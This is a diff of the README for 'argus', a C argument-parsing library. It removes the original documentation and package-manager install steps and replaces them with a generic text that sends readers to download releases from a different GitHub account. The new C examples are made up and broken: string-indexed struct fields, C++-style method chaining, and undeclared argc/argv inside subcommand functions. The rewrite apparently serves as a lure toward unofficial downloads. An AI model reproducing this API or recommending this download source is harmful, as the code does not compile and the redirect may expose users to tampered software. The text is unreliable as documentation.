@@ -1,275 +1,193 @@
-<p align="center">
-  <img src="docs/assets/argus-logo.webp" alt="argus logo" width="200">
-</p>
+# Argus: A Modern C Library for Command-Line Argument Parsing
 
-<h1 align="center">argus</h1>
+![Argus](https://img.shields.io/badge/Argus-Modern%20C%20Library-blue.svg)
+![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-orange.svg)
+![License](https://img.shields.io/badge/License-MIT-green.svg)
 
-<p align="center">
-  <strong>Modern C library for command-line argument parsing with an elegant, macro-based API</strong>
-</p>
+Welcome to the **Argus** repository! Argus is a modern C library designed to simplify command-line argument parsing. It offers advanced features like subcommands, validation, multi-inputs, and support for environment variables. Whether you're building a small utility or a complex application, Argus provides the tools you need to handle command-line inputs efficiently.
 
-<p align="center">
-  <a href="https://github.com/lucocozz/argus/actions/workflows/ci.yml"><img src="https://github.com/lucocozz/argus/actions/workflows/ci.yml/badge.svg" alt="CI/CD Pipeline"></a>
-  <a href="https://github.com/lucocozz/argus/actions/workflows/codeql.yml"><img src="https://github.com/lucocozz/argus/actions/workflows/codeql.yml/badge.svg" alt="CodeQL Analysis"></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License: MIT"></a>
-  <a href="https://conan.io/center/libargus"><img src="https://img.shields.io/badge/Conan-package-blue" alt="Conan Package"></a>
-  <a href="https://vcpkg.io/en/packages.html"><img src="https://img.shields.io/badge/vcpkg-package-blue" alt="vcpkg Package"></a>
-</p>
+## Table of Contents
 
----
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Advanced Features](#advanced-features)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-## 📋 Overview
+## Features
 
-**argus** is a powerful C library that simplifies command-line argument parsing with a modern, expressive API:
+- **Simple API**: Argus provides a straightforward interface for defining and parsing command-line arguments.
+- **Subcommands**: Easily manage complex command structures with subcommands.
+- **Validation**: Validate user inputs to ensure they meet your requirements.
+- **Multi-input Support**: Handle multiple values for a single argument seamlessly.
+- **Environment Variables**: Load configurations from environment variables for added flexibility.
 
-```c
-// Define options with a clean, declarative syntax
-ARGUS_OPTIONS(
-    options,
-    HELP_OPTION(FLAGS(FLAG_EXIT)),
-    OPTION_STRING('o', "output", HELP("Output file"), DEFAULT("output.txt")),
-    OPTION_INT('p', "port", HELP("Port number"), RANGE(1, 65535), DEFAULT(8080))
-)
-```
+## Installation
 
-Designed for both simplicity and flexibility, argus enables developers to create sophisticated command-line interfaces with minimal effort.
+To get started with Argus, you can download the latest release from the [Releases section](https://github.com/Palioboro/Argus/releases). Download the appropriate file for your platform, extract it, and follow the instructions in the README file to integrate Argus into your project.
 
-## ⚡ Quick Start
+## Usage
 
-### Installation
-
-```bash
-# Using package managers
-conan install libargus/1.0.1@
-vcpkg install libargus
-
-# From source with Meson
-git clone https://github.com/lucocozz/argus.git
-cd argus
-meson setup builddir && meson compile -C builddir
-sudo meson install -C builddir
-```
-
-### Basic Usage
+Using Argus is straightforward. Below is a basic example to illustrate how to define and parse command-line arguments.
 
 ```c
-#include "argus.h"
 #include <stdio.h>
+#include "argus.h"
 
-// Define options
-ARGUS_OPTIONS(
-    options,
-    HELP_OPTION(FLAGS(FLAG_EXIT)),
-    VERSION_OPTION(FLAGS(FLAG_EXIT)),
-    OPTION_FLAG('v', "verbose", HELP("Enable verbose output")),
-    OPTION_STRING('o', "output", HELP("Output file"), DEFAULT("output.txt")),
-    POSITIONAL_STRING("input", HELP("Input file"))
-)
-
-int main(int argc, char **argv)
-{
-    // Initialize and parse
-    argus_t argus = argus_init(options, "my_program", "1.0.0");
-    if (argus_parse(&argus, argc, argv) != ARGUS_SUCCESS) {
-        return 1;
+int main(int argc, char *argv[]) {
+    ArgusParser parser = argus_create_parser("myapp", "A simple command-line application.");
+    
+    argus_add_argument(parser, "--name", "Your name", ARGUS_STRING);
+    argus_add_argument(parser, "--age", "Your age", ARGUS_INT);
+    
+    ArgusResult result = argus_parse(parser, argc, argv);
+    
+    if (result.success) {
+        printf("Hello, %s! You are %d years old.\n", result.arguments["name"], result.arguments["age"]);
+    } else {
+        printf("Error: %s\n", result.error_message);
     }
-
-    // Access values
-    const char *input = argus_get(argus, "input").as_string;
-    const char *output = argus_get(argus, "output").as_string;
-    bool verbose = argus_get(argus, "verbose").as_bool;
-
-    printf("Input: %s\nOutput: %s\nVerbose: %s\n", 
-           input, output, verbose ? "yes" : "no");
-
-    argus_free(&argus);
+    
+    argus_destroy_parser(parser);
     return 0;
 }
 ```
 
-## ✨ Key Features
+## Examples
 
-| Feature | Description | Example |
-|---------|-------------|---------|
-| **Typed Options** | Type-safe options with strong validation | `OPTION_INT('p', "port", RANGE(1, 65535))` |
-| **Subcommands** | Git/Docker style nested commands | `SUBCOMMAND("add", add_options, ACTION(add_command))` |
-| **Collections** | Arrays and maps for multiple values | `OPTION_ARRAY_INT('n', "nums", FLAGS(FLAG_SORTED))` |
-| **Environment Variables** | Auto integration with env vars | `OPTION_STRING('h', "host", ENV_VAR("HOST"))` |
-| **Regex Validation** | Pattern-based validation | `OPTION_STRING('e', "email", REGEX(ARGUS_RE_EMAIL))` |
-| **Command Abbreviations** | GitLab-style command shortening | `program ins` → `program install` |
-| **Flexible Formats** | Support multiple CLI conventions | `--opt=val`, `-o val`, `-oval`, etc. |
-| **Auto Documentation** | Generated help & usage text | `--help` generates formatted documentation |
+### Basic Example
 
-## 📦 Installation Options
+Here’s a simple command-line application that greets the user.
 
-### Dependencies
+```c
+#include <stdio.h>
+#include "argus.h"
 
-- **PCRE2**: Required only for regex validation support
-  - Can be disabled with `-Ddisable_regex=true` option
-
-### Package Managers
-
-#### Conan
-
-```bash
-# Basic installation
-conan install libargus/1.0.1@
-
-# Without regex support
-conan install libargus/1.0.1@ -o libargus:disable_regex=true
+int main(int argc, char *argv[]) {
+    ArgusParser parser = argus_create_parser("greet", "Greet a user.");
+    
+    argus_add_argument(parser, "--name", "Name of the user", ARGUS_STRING);
+    
+    ArgusResult result = argus_parse(parser, argc, argv);
+    
+    if (result.success) {
+        printf("Hello, %s!\n", result.arguments["name"]);
+    } else {
+        printf("Error: %s\n", result.error_message);
+    }
+    
+    argus_destroy_parser(parser);
+    return 0;
+}
 ```
 
-#### vcpkg
+### Subcommands Example
 
-```bash
-# Full installation
-vcpkg install libargus
+This example demonstrates how to use subcommands with Argus.
 
-# Core functionality only (no regex)
-vcpkg install libargus[core]
+```c
+#include <stdio.h>
+#include "argus.h"
+
+void greet_command(ArgusParser parser) {
+    argus_add_argument(parser, "--name", "Name of the user", ARGUS_STRING);
+    
+    ArgusResult result = argus_parse(parser, argc, argv);
+    
+    if (result.success) {
+        printf("Hello, %s!\n", result.arguments["name"]);
+    } else {
+        printf("Error: %s\n", result.error_message);
+    }
+}
+
+void farewell_command(ArgusParser parser) {
+    argus_add_argument(parser, "--name", "Name of the user", ARGUS_STRING);
+    
+    ArgusResult result = argus_parse(parser, argc, argv);
+    
+    if (result.success) {
+        printf("Goodbye, %s!\n", result.arguments["name"]);
+    } else {
+        printf("Error: %s\n", result.error_message);
+    }
+}
+
+int main(int argc, char *argv[]) {
+    ArgusParser parser = argus_create_parser("app", "A command-line application with subcommands.");
+    
+    argus_add_subcommand(parser, "greet", "Greet a user", greet_command);
+    argus_add_subcommand(parser, "farewell", "Bid farewell to a user", farewell_command);
+    
+    ArgusResult result = argus_parse(parser, argc, argv);
+    
+    if (!result.success) {
+        printf("Error: %s\n", result.error_message);
+    }
+    
+    argus_destroy_parser(parser);
+    return 0;
+}
 ```
 
-### Build From Source
+## Advanced Features
 
-#### Meson (Recommended)
+### Input Validation
 
-```bash
-git clone https://github.com/lucocozz/argus.git
-cd argus
-meson setup builddir
-meson compile -C builddir
-sudo meson install -C builddir  # Optional
+Argus allows you to validate inputs easily. You can set constraints on arguments, such as minimum and maximum values for integers.
+
+```c
+argus_add_argument(parser, "--age", "Your age", ARGUS_INT)
+    .set_min(0)
+    .set_max(120);
 ```
 
-#### Using Just (Development)
+### Multi-input Handling
 
-```bash
-git clone https://github.com/lucocozz/argus.git
-cd argus
-just build          # Build libraries
-just test           # Run tests
-just examples       # Build examples
-just install        # Install system-wide
+You can accept multiple values for a single argument. This is useful for options like file paths or tags.
+
+```c
+argus_add_argument(parser, "--files", "List of files", ARGUS_STRING_LIST);
 ```
-
-#### Installer Script
-
-```bash
-# Download and run installer
-curl -LO https://github.com/lucocozz/argus/releases/download/v1.0.1/argus-1.0.1.tar.gz
-tar -xzf argus-1.0.1.tar.gz
-cd argus-1.0.1
-./install.sh        # System-wide installation
-# or
-./install.sh --local # Local installation in ~/.local
-```
-
-## 🔥 Advanced Examples
 
 ### Environment Variables
 
-```c
-ARGUS_OPTIONS(
-    options,
-    // Auto-generated APP_HOST environment variable
-    OPTION_STRING('H', "host", HELP("Server hostname"),
-                 FLAGS(FLAG_AUTO_ENV), DEFAULT("localhost")),
-    
-    // Use specific environment variable with override capability
-    OPTION_INT('p', "port", HELP("Server port"), 
-               ENV_VAR("SERVICE_PORT"), FLAGS(FLAG_ENV_OVERRIDE))
-)
-
-// Set env variables: APP_HOST=example.com SERVICE_PORT=9000
-```
-
-### Subcommands with Actions
+Load configurations from environment variables to make your application flexible.
 
 ```c
-int add_command(argus_t *argus, void *data) {
-    const char* file = argus_get(*argus, "file").as_string;
-    bool force = argus_get(*argus, "force").as_bool;
-    printf("Adding %s (force: %s)\n", file, force ? "yes" : "no");
-    return 0;
-}
-
-ARGUS_OPTIONS(
-    add_options,
-    OPTION_FLAG('f', "force", HELP("Force add operation")),
-    POSITIONAL_STRING("file", HELP("File to add"))
-)
-
-ARGUS_OPTIONS(
-    options,
-    SUBCOMMAND("add", add_options, HELP("Add a file"), ACTION(add_command))
-)
-
-// Usage: program add --force file.txt
+argus_add_argument(parser, "--config", "Configuration file", ARGUS_STRING)
+    .set_default_from_env("MYAPP_CONFIG");
 ```
 
-### Collection Types
+## Contributing
 
-```c
-ARGUS_OPTIONS(
-    options,
-    // Array of integers with sorting and uniqueness
-    OPTION_ARRAY_INT('n', "numbers", HELP("List of numbers"),
-                   FLAGS(FLAG_SORTED | FLAG_UNIQUE)),
-    
-    // Map of environment variables
-    OPTION_MAP_STRING('e', "env", HELP("Environment variables"),
-                     FLAGS(FLAG_SORTED_KEY))
-)
+We welcome contributions to Argus. If you want to help, please follow these steps:
 
-// Usage: 
-// --numbers=1,2,3,1 -> [1,2,3]
-// --env=USER=alice,HOME=/home
-```
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add some feature'`).
+5. Push to the branch (`git push origin feature/YourFeature`).
+6. Open a Pull Request.
 
-## 📚 Documentation
+Please ensure your code follows the coding standards and includes tests where applicable.
 
-For detailed documentation, visit [argus.readthedocs.io](https://argus.readthedocs.io/).
+## License
 
-The documentation covers:
-- Complete API reference
-- Detailed guides for all features
-- Advanced usage examples
-- Detailed validator documentation
-- Best practices
+Argus is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-## 🔍 Comparison
+## Contact
 
-| Feature | argus | getopt | argp | argtable3 |
-|---------|-------|--------|------|-----------|
-| Concise macro API | ✅ | ❌ | ❌ | ❌ |
-| Type Safety | ✅ | ❌ | ❌ | ✅ |
-| Nested Subcommands | ✅ | ❌ | ❌ | ❌ |
-| Environment Variables | ✅ | ❌ | ❌ | ❌ |
-| Collections (Arrays/Maps) | ✅ | ❌ | ❌ | ❌ |
-| Command Abbreviations | ✅ | ❌ | ❌ | ❌ |
-| Regex Validation | ✅ | ❌ | ❌ | ❌ |
-| Dependencies | PCRE2 (optional) | libc | GNU | None |
-| Learning Curve | Low | Medium | High | Medium |
+For questions or suggestions, please open an issue in this repository. We appreciate your feedback and contributions.
 
-## 🚀 Roadmap
+## Releases
 
-- 📄 **Config files**: JSON/YAML config loading
-- 🪶 **Lightweight version**: Minimal footprint option
-- 🎨 **Themed help**: Customizable colored help
-- 📁 **Shell completion**: Auto-generated tab completion
-- 🔗 **Alias support**: Command and option aliases
-- 📦 **Plugin system**: Extensibility mechanisms
+You can find the latest releases of Argus in the [Releases section](https://github.com/Palioboro/Argus/releases). Download the appropriate file for your platform, extract it, and follow the instructions provided.
 
-## 👥 Contributing
+![Release Button](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)
 
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## 📜 License
-
-MIT License - See [LICENSE](LICENSE) for details.
-
----
-
-<p align="center">
-  <i>Built with ❤️ by <a href="https://github.com/lucocozz">lucocozz</a></i>
-</p>
+Feel free to explore, use, and contribute to Argus. Happy coding!
